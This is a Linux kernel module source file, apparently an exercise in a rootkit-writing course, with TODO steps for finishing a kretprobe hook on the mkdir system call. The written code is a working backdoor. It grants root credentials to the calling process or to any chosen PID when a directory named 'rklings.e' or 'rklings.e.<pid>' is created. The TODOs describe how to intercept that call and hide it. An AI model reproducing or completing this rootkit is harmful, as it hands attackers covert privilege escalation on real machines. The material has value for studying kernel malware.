// SPDX-License-Identifier: GPL-2.0
//
// Your task: delete the rklings_hook.h dependency and rewrite
// the kretprobe hook inline. See README for a walkthrough.
//
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = find_task_by_vpid(pid);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	return 0;
}

static int rk_handle_mkdir(const char *name)
{
	const char *suffix;
	int pid;

	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate();
	if (strncmp(name, "rklings.e.", 10) != 0)
		return -ENOENT;
	suffix = name + 10;
	if (kstrtoint(suffix, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;
	return rk_escalate_pid(pid);
}

// TODO: Define struct rk_mkdir_data { int result; bool intercepted; }

// TODO: Write rk_mkdir_entry (kretprobe entry handler)
// - Cast inst->data to struct rk_mkdir_data
// - Set intercepted = false
// - Extract inner pt_regs: regs_get_kernel_argument(regs, 0)
// - Read pathname from uregs->di with strncpy_from_user
// - Find basename with strrchr(buf, '/')
// - Check "rklings." prefix with strncmp
// - Call rk_handle_mkdir, store result
// - put_user('\0', pathname) to suppress the real mkdir

// TODO: Write rk_mkdir_return (kretprobe return handler)
// - If intercepted, regs_set_return_value(regs, result)

// TODO: Define struct kretprobe for __x64_sys_mkdir

static int __init rk_init(void)
{
	// TODO: return register_kretprobe(&your_probe);
	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: unregister_kretprobe(&your_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings inline kretprobe hook");
